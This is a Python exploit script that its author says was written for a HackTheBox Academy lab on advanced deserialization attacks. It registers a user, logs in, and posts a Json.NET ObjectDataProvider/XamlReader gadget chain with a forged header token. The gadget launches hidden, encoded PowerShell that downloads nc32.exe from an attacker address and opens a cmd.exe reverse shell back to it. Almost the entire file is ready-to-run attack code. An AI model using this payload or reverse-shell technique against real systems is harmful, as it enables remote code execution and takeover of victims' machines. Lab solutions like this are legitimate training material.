#! /usr/bin/env python3

'''Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Advanced Deserialization Attacks'. 
This script exploits an insecure deserialization to get a reverse shell. Update the following variables before running the script: attacker_IP, attacker_hosting_file_port, attacker_listening_port, and target.  Next, open a netcat listener to catch the reverse shell, and a server to host the netcat.exe'''

import requests
import base64

attacker_IP= "10.10.10.10"
attacker_hosting_file_port= "4414"
attacker_listening_port= "4415"

target= f"10.129.10.225:8000"
proxies= {"http":"http://127.0.0.1:8080"}
session= requests.session()
headers= {"Content-Type": "application/x-www-form-urlencoded"}
data= f"u=test&f=test&l=test&e=test%40a.com&p=test&r=test"

# Register user
response= requests.post(url=f"http://{target}/Auth/Register", data=data, proxies=proxies, headers=headers, allow_redirects=False, verify=False)

# Login
data= f"u=test&p=test"
response2= session.post(url=f"http://{target}/Auth/Login", data=data, proxies=proxies, headers=headers, allow_redirects=False, verify=False)

# Exploit Insecure Deserialization 
payload = fr'(new-object net.webclient).downloadfile("http://{attacker_IP}:{attacker_hosting_file_port}/nc32.exe", "c:\windows\tasks\nc32.exe");c:\windows\tasks\nc32.exe -nv {attacker_IP} {attacker_listening_port} -e c:\windows\system32\cmd.exe;'
base64_payload = base64.b64encode(payload.encode("utf-16-le")).decode()

# SecureAuth.Devtoken created by deobfuscating the XOR strings in Cerealizer.Auth.Devtoken.cs
headers= {"Content-Type": "application/json", "SecureAuth.Devtoken": "B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0="}

data= f'{{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework","ObjectInstance": {{"$type": "System.Windows.Markup.XamlReader, PresentationFramework"}},"MethodParameters": {{"$type": "MS.Internal.Data.ParameterCollection, PresentationFramework","$values": ["<ObjectDataProvider MethodName=\\"Start\\" xmlns=\\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\\" xmlns:sd=\\"clr-namespace:System.Diagnostics;assembly=System\\" xmlns:sc=\\"clr-namespace:System.Collections;assembly=mscorlib\\" xmlns:x=\\"http://schemas.microsoft.com/winfx/2006/xaml\\"><ObjectDataProvider.ObjectInstance><sd:Process><sd:Process.StartInfo><sd:ProcessStartInfo Arguments=\\"-WindowStyle Hidden -NonInteractive -exec bypass -enc {base64_payload}\\" StandardErrorEncoding=\\"{{x:Null}}\\" StandardOutputEncoding=\\"{{x:Null}}\\" UserName=\\"\\" Password=\\"{{x:Null}}\\" Domain=\\"\\" LoadUserProfile=\\"False\\" FileName=\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\V1.0\\\\powershell.exe\\"></sd:ProcessStartInfo></sd:Process.StartInfo></sd:Process></ObjectDataProvider.ObjectInstance></ObjectDataProvider>"]}},"MethodName": "Parse"}}'

response= session.post(url= f"http://{target}/Profile/Load", data=data, proxies=proxies, headers=headers, allow_redirects=False, verify=False)

